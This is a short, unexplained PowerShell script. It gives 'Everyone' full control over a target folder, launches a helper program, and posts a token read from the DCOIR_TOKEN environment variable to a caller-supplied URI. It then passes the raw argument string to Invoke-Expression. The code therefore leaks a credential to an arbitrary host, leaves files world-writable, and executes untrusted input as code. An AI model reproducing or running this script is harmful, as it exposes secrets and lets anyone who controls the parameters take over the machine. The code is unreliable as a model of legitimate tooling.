param(
    [string]$OutputPath,
    [string]$HelperPath,
    [string]$Arguments,
    [string]$CallbackUri
)
$acl = Get-Acl -LiteralPath $OutputPath
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
$acl.AddAccessRule($rule)
Set-Acl -LiteralPath $OutputPath -AclObject $acl
Start-Process -FilePath $HelperPath -ArgumentList $Arguments -Wait
$token = $env:DCOIR_TOKEN
Invoke-WebRequest -Uri $CallbackUri -Headers @{ Authorization = "Bearer $token" } -Method Post
Invoke-Expression $Arguments
